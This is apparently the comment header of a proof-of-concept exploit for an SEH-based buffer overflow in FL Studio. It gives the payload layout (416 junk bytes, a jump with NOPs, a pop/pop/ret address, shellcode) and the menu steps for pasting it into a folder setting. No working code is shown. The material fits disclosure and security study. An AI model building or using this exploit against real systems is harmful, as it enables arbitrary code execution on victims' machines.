# Fl Studio is Prone to a SEH based Buffer Overflow which allows attacker to execute arbitary code on the victim's machine .
# To trigger the vulnerability the attacker must fake the "Browser Extra search folder" path & paste the input released from this PoC .
# Looking a little bit deeper in the stack & in the EBP register we will see that the software will try to create a file named e.g. BBBBCCCC.NFO
# Then the EIP is overwritten with the SEH address .
# The Exploit will look like this : [Junk "A" x 416] [6 Bytes Jump + 2Nops ] [p/p/r address or other] [Shellcode] .
# Go to Options ---> File Settings ---> Choose File In the left column ---> Paste the input in Browser Extra Search Folder ---> Press Enter ---> and close the window .
# == Crash Triggered + Seh Overwritten .
